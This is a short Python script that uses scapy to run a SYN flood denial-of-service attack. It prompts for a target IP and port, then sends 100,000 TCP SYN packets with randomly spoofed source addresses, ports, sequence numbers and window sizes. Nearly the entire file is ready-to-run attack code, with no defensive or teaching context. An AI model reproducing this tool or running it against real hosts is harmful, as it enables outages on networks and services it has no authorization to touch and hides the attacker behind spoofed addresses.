#!/usr/bin/env python3

from scapy import *
from scapy.all import *
import os
import sys
import random
import socket

class syn_flood:
	def randomIP():
		ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
		return ip

	def randInt():
		x = random.randint(1000,9000)
		return x	

	def SYN_Flood(victim_ip,victim_port, total):
		counter = 0
		fixed_val = int(512)
		#source_ip = "192.168.90.5"
		#print("IP packet source is :", source_ip)
		print ("Sending "+ str(total) + " packets")
		print ("Packets are sending ...")
		for x in range (0,total):
			s_port = syn_flood.randInt()
			s_eq = syn_flood.randInt()
			w_indow = syn_flood.randInt()
			
			source_ip = syn_flood.randomIP()
			IP_Packet = IP()
			IP_Packet.src = source_ip
			IP_Packet.dst = victim_ip

			TCP_Packet = TCP()	
			TCP_Packet.sport = s_port
			TCP_Packet.dport = victim_port
			TCP_Packet.flags = 'S'
			TCP_Packet.seq = s_eq
			TCP_Packet.window = w_indow

			send(IP_Packet/TCP_Packet, verbose=False)
			counter+=1
		sys.stdout.write("\nTotal packets sent: %i\n" % total)
		input("Press any key to continue...")
	
	def execute():
		victim_ip = input ("Target IP : ")
		victim_port = int(input ("Target Port : "))
		total = 100000
		syn_flood.SYN_Flood(victim_ip,victim_port, total)
